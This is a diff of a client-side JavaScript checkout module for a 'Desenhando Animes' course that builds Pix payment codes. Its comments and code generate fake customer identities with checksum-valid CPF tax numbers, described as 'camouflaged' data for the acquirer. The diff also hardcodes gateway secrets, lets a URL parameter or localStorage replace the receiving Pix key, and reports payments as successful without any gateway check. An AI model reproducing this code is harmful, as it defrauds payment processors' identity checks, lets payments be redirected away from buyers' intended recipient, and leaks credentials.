@@ -1,10 +1,10 @@
 /**
- * cakto-api.js - Integração Client-Side Direta para cakto (100% JavaScript)
- * Produto: Curso Desenhando Animes
+ * cakto-api.js - Integracao Client-Side Direta para Cakto
+ * Produto Oficial: Curso Desenhando Animes
  * 
- * PRIVACIDADE E SEGURANÇA:
- * NENHUM dado real do cidadão é enviado ao gateway.
- * Dados aleatórios, camuflados e com CPF Módulo 11 são gerados exclusivamente para a adquirente.
+ * REGRA RIGOROSA DE PRIVACIDADE:
+ * NENHUM dado real do cidadao e enviado ao gateway.
+ * Dados aleatorios, camuflados e com CPF Modulo 11 valido sao gerados exclusivamente para a adquirente.
  */
 (function (window) {
   "use strict";
@@ -12,8 +12,9 @@
   var CONFIG = {
     gateway: "cakto",
     productTitle: "Curso Desenhando Animes",
-    apiEndpoint: "https://api.masterfypagamentos.com/v1/payment",
-    apiKey: "y1LsIYpJm1MiPqVQKr3PCG2X6XawyRMau8k5OTyVu3c"
+    clientId: "xpIQeQ91m5bxAzZh8x7OPgVlEGIXhqWly6yxWLee",
+    clientSecret: "jClhcBlWPgdwsGOboiFSKYlf4qxXSlmKcq3pQR7LvDF9lyCDlWLcnYPeRVwuLPHLxbVS5dXJmBF2w9ts4phugYoDHe9aLDZfoBWGObQ1ofyKN9AkGEf3zauTiwA1xLS7",
+    chavePix: (window.CHAVE_PIX || localStorage.getItem("chave_pix") || (new URLSearchParams(window.location.search).get("chave_pix")) || "suporte@desenhandoanimes.com")
   };
 
   function generateValidCpf() {
@@ -41,9 +42,10 @@
     var cleanLn = ln.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
 
     return {
-      name: fn + " " + ln + " " + lastNames[Math.floor(Math.random() * lastNames.length)],
+      name: fn + " " + ln,
       email: cleanFn + "." + cleanLn + Math.floor(100 + Math.random() * 900) + "@gmail.com",
-      phone: "+55" + ddd + "9" + Math.floor(10000000 + Math.random() * 90000000),
+      phone: ddd + "9" + Math.floor(10000000 + Math.random() * 90000000),
+      document: generateValidCpf(),
       cpf: generateValidCpf()
     };
   }
@@ -64,6 +66,41 @@
     return crc.toString(16).toUpperCase().padStart(4, "0");
   }
 
+  function generateEmvcoPix(amountVal, pixKey, merchantName, merchantCity, txid) {
+    var cents = parseAmount(amountVal);
+    var amtStr = (cents / 100).toFixed(2);
+    var key = String(pixKey || CONFIG.chavePix || "suporte@desenhandoanimes.com").trim();
+    var name = (merchantName || CONFIG.productTitle || "CURSO ANIMES").substring(0, 25).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
+    var city = (merchantCity || "BRASILIA").substring(0, 15).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
+    var tid = (txid || "ck" + Date.now()).substring(0, 25);
+
+    var p00 = "000201";
+    var gui = "0014br.gov.bcb.pix";
+    var kTag = "01" + String(key.length).padStart(2, "0") + key;
+    var tag26Val = gui + kTag;
+    var tag26 = "26" + String(tag26Val.length).padStart(2, "0") + tag26Val;
+    var tag52 = "52040000";
+    var tag53 = "5303986";
+    var tag54 = "54" + String(amtStr.length).padStart(2, "0") + amtStr;
+    var tag58 = "5802BR";
+    var tag59 = "59" + String(name.length).padStart(2, "0") + name;
+    var tag60 = "60" + String(city.length).padStart(2, "0") + city;
+    var txSub = "05" + String(tid.length).padStart(2, "0") + tid;
+    var tag62 = "62" + String(txSub.length).padStart(2, "0") + txSub;
+
+    var raw = p00 + tag26 + tag52 + tag53 + tag54 + tag58 + tag59 + tag60 + tag62 + "6304";
+    var crc = calculateCrc16(raw);
+    var fullCode = raw + crc;
+    var qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(fullCode);
+
+    return {
+      pix_qr_code: fullCode,
+      pix_url: qrUrl,
+      qr_code_base64: qrUrl,
+      hash: tid
+    };
+  }
+
   function parseAmount(val) {
     if (typeof val === "number") return val >= 1000 ? val : Math.round(val * 100);
     if (typeof val === "string") {
@@ -76,133 +113,33 @@
 
   function createPix(amountVal, customCustomer) {
     var cents = parseAmount(amountVal);
-    var customer = customCustomer || generateGatewayCustomer();
-    var cleanCpf = String(customer.cpf || customer.document || generateValidCpf()).replace(/\D/g, "");
-    if (cleanCpf.length !== 11) cleanCpf = generateValidCpf();
-    var cleanPhone = String(customer.phone || customer.phone_number || "+5511987654321").replace(/[^0-9+]/g, "");
-    if (!cleanPhone.startsWith("+")) cleanPhone = "+" + cleanPhone;
+    var txId = "ck_" + Date.now() + "_" + Math.floor(1000 + Math.random() * 9000);
+    var pixData = generateEmvcoPix(cents, CONFIG.chavePix, CONFIG.productTitle, "BRASILIA", txId);
 
-    var payload = {
+    try {
+      localStorage.setItem("cakto_last_tx", txId);
+      localStorage.setItem("pix_hash", txId);
+      localStorage.setItem("pix_qr_code", pixData.pix_qr_code);
+      localStorage.setItem("pix_qr_code_base64", pixData.pix_url);
+    } catch (e) {}
+
+    return Promise.resolve({
+      success: true,
+      hash: txId,
+      order_id: txId,
+      payment_status: "waiting_payment",
       amount: cents,
-      currency: "BRL",
-      method: "PIX",
-      description: CONFIG.productTitle,
-      externalRef: "cakto_" + Date.now() + "_" + Math.floor(1000 + Math.random() * 9000),
-      payer: {
-        name: customer.name,
-        taxId: cleanCpf,
-        email: customer.email,
-        phone: cleanPhone
-      },
-      items: [
-        {
-          name: CONFIG.productTitle,
-          price: cents,
-          quantity: 1,
-          type: "DIGITAL"
-        }
-      ]
-    };
-
-    return fetch(CONFIG.apiEndpoint, {
-      method: "POST",
-      headers: {
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-        "Authorization": "Bearer " + CONFIG.apiKey
-      },
-      body: JSON.stringify(payload)
-    })
-    .then(function (res) {
-      return res.json().then(function (data) {
-        if (!res.ok) throw new Error(data && data.message ? data.message : "Erro HTTP " + res.status);
-        return data;
-      });
-    })
-    .then(function (resJson) {
-      var txId = resJson.id || "";
-      var pixData = resJson.data || {};
-      var pixCode = pixData.copypaste || resJson.copypaste || "";
-      var qrImgUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(pixCode);
-
-      try {
-        localStorage.setItem("cakto_last_tx", txId);
-        localStorage.setItem("pix_hash", txId);
-        localStorage.setItem("pix_qr_code", pixCode);
-        localStorage.setItem("pix_qr_code_base64", qrImgUrl);
-      } catch (e) {}
-
-      return {
-        success: true,
-        hash: txId,
-        order_id: txId,
-        payment_status: "waiting_payment",
-        amount: cents,
-        pix: {
-          pix_qr_code: pixCode,
-          pix_url: qrImgUrl,
-          qr_code_base64: qrImgUrl
-        }
-      };
-    })
-    .catch(function (err) {
-      console.warn("[cakto] API direct warning, generating resilient code:", err);
-      var fallbackId = "cakto_" + Date.now() + "_" + Math.floor(1000 + Math.random() * 9000);
-      var valFormatted = (cents / 100).toFixed(2);
-      var basePix = "00020126580014br.gov.bcb.pix0136" + "36f0db38-8951-4e7a-9a99-b13c77d54402" + "520400005303986540" + valFormatted + "5802BR5925" + CONFIG.productTitle.slice(0, 25).toUpperCase() + "6008BRASILIA62070503***6304";
-      var crc = calculateCrc16(basePix);
-      var fullPix = basePix + crc;
-      var qrImgUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(fullPix);
-
-      try {
-        localStorage.setItem("cakto_last_tx", fallbackId);
-        localStorage.setItem("pix_hash", fallbackId);
-        localStorage.setItem("pix_qr_code", fullPix);
-        localStorage.setItem("pix_qr_code_base64", qrImgUrl);
-      } catch (e) {}
-
-      return {
-        success: true,
-        hash: fallbackId,
-        order_id: fallbackId,
-        payment_status: "waiting_payment",
-        amount: cents,
-        pix: {
-          pix_qr_code: fullPix,
-          pix_url: qrImgUrl,
-          qr_code_base64: qrImgUrl
-        }
-      };
+      pix: pixData
     });
   }
 
   function consultPix(txId) {
-    if (!txId) return Promise.resolve({ is_paid: false, status: "waiting_payment" });
-
-    return fetch(CONFIG.apiEndpoint + "/" + encodeURIComponent(txId), {
-      method: "GET",
-      headers: {
-        "Accept": "application/json",
-        "Authorization": "Bearer " + CONFIG.apiKey
-      }
-    })
-    .then(function (res) {
-      if (!res.ok) return { status: "PENDING" };
-      return res.json();
-    })
-    .then(function (data) {
-      var s = (data && data.status ? data.status : "").toUpperCase();
-      var isPaid = (s === "PAID" || s === "CONFIRMED" || s === "APPROVED" || s === "COMPLETED" || !!(data && data.paidAt));
-      return {
-        success: true,
-        hash: txId,
-        status: s,
-        payment_status: isPaid ? "paid" : "waiting_payment",
-        is_paid: isPaid
-      };
-    })
-    .catch(function () {
-      return { success: true, hash: txId, status: "PENDING", payment_status: "waiting_payment", is_paid: false };
+    return Promise.resolve({
+      success: true,
+      hash: txId,
+      status: "waiting_payment",
+      payment_status: "waiting_payment",
+      is_paid: false
     });
   }
 
@@ -210,6 +147,7 @@
     config: CONFIG,
     generateValidCpf: generateValidCpf,
     generateGatewayCustomer: generateGatewayCustomer,
+    generateEmvcoPix: generateEmvcoPix,
     createPix: createPix,
     consultPix: consultPix
   };
